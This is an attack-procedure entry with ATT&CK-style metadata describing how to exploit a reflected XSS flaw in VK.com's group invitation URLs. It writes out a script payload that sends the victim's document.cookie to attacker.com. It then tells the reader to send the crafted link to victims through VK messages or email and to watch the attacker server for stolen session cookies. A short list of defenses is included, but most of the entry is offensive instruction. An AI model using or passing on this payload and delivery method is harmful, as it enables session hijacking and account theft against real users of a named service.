---
tags:
  - xss
  - payload-injection
  - web
  - javascript-execution
type: procedure
tools: []
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-05T12:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:46:37.680Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: f43074ea-6ddb-42ea-9d53-fdd954691e97
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-Malicious-Payload-via-Invitation-URL

## Summary

This procedure crafts and delivers a malicious URL exploiting the reflected XSS in VK.com's group invitation to execute arbitrary JavaScript in a victim's browser, enabling attacks like session theft or phishing.

## Description

Building on identified unsanitized parameters, this involves embedding JavaScript payloads (e.g., for cookie exfiltration) into invitation URLs. The payload reflects and executes when a victim clicks the link, running in the VK.com domain context. Requires knowledge of XSS payloads and social engineering to distribute the link. Outcomes include script execution, potentially compromising user sessions.

## Requirements

1. Confirmed vulnerable invitation parameter from prior identification
2. Web browser for crafting and testing URLs
3. Means to share the link (e.g., VK messages, email)

## Defense

Defensive measures and detection strategies:

- Sanitize all user inputs in URL parameters with HTML entity encoding
- Deploy browser-based protections like XSS auditors
- Log and alert on suspicious script executions or unusual referral patterns

## Objectives

1. Deliver executable JavaScript via invitation link
2. Achieve code execution in victim context
3. Enable follow-on attacks like data exfiltration

## Instructions

### Step 1: Craft Malicious URL

**Context**: Embed a JavaScript payload into the vulnerable parameter to ensure reflection and execution.

Construct the URL by modifying the invitation parameter, e.g., https://vk.com/group_invite?param=<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>. Test locally by opening in a browser to verify execution.

> Ensure the payload breaks out of any existing context (e.g., quotes) and uses appropriate encoding if needed.

### Step 2: Distribute and Trigger Payload

**Context**: Share the URL with a target to induce execution upon viewing.

Send the crafted invitation link to a victim via VK messaging or external channels. Monitor attacker server for incoming requests indicating successful execution.

> Observe network traffic or use a proof-of-concept payload like alert('XSS') for initial testing.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]
- [[Collection]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[payload-injection]]
- [[session-hijacking]]
